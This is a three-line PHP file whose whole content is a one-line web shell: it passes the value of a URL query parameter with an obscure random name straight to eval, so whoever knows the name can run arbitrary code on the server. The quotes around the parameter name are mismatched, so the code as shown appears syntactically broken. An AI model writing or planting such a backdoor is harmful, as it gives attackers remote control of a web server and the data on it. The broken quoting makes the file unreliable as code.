<?php
eval($_GET["xLu_-wUz']);
?>
